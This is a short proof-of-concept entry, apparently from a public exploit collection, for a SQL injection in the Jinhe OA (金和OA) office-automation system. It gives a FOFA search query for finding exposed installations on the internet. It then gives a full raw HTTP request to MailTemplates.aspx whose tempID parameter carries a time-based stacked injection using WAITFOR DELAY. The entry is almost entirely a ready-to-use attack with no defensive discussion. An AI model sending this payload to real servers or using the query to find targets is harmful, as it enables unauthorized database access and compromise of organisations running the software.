## 金和OA_MailTemplates.aspx_SQL注入漏洞

## fofa
```
app="金和网络-金和OA"
```

## poc
```
GET /C6/JHSoft.Web.Mail/MailTemplates.aspx/?tempID=1%3BWAITFOR+DELAY+%270%3A0%3A3%27-- HTTP/1.1
Host: you_ip
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

```

![image](https://github.com/wy876/POC/assets/139549762/e0ea8fe9-db1d-4f17-ba75-d8dc01cb085f)

![image](https://github.com/wy876/POC/assets/139549762/c3b40a68-6354-4667-ba6c-5f061b5f050f)
